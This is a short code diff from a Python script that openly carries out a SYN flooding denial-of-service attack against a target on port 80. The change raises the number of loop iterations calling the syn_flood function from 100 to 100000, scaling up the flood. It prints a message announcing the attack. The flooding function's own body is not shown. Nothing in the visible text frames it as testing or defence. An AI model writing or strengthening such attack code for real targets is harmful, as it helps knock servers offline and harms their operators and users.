@@ -39,5 +39,5 @@ if __name__ == "__main__":
     target_port = 80
     interface_name = get_interface_name(target_ip, target_port)
     print(f"Initiating SYN flooding attack on {target_ip}:{target_port}:{interface_name}...")
-    for i in range(100):
+    for i in range(100000):
         syn_flood(target_ip, target_port, interface_name)
